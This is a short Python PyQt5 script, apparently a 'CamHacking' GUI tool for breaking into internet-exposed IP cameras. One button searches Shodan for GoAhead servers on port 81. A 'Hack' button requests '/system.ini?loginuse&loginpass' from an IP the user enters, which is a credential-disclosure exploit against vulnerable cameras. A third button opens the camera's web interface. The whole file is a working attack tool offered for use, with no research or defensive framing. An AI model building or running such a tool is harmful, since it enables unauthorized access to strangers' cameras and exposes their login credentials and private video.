import sys
import webbrowser
from PyQt5 import QtCore, QtGui, QtWidgets
from CamHacking import Ui_dialog
import requests

# app
app = QtWidgets.QApplication(sys.argv)

# init
Dialog = QtWidgets.QDialog()
ui = Ui_dialog()
ui.setupUi(Dialog)
Dialog.show()

# Functions
def Search():
	webbrowser.open("https://www.shodan.io/search?query=realm=\"Goahead\", domain=\":81\"")

ui.pushButton.clicked.connect( Search )

def Hack():
	IP = ui.lineEdit.text()
	url1 = ("http://")
	url2 = (":81/system.ini?loginuse&loginpass")
	webbrowser.open(url1 + str(IP) + url2)

ui.pushButton_4.clicked.connect( Hack )

def Explorer():
	IP = ui.lineEdit.text()
	url1 = ("http://")
	url2 = (":81")
	webbrowser.open(url1 + str(IP) + url2)

ui.pushButton_2.clicked.connect( Explorer )

# Main loop
sys.exit(app.exec_())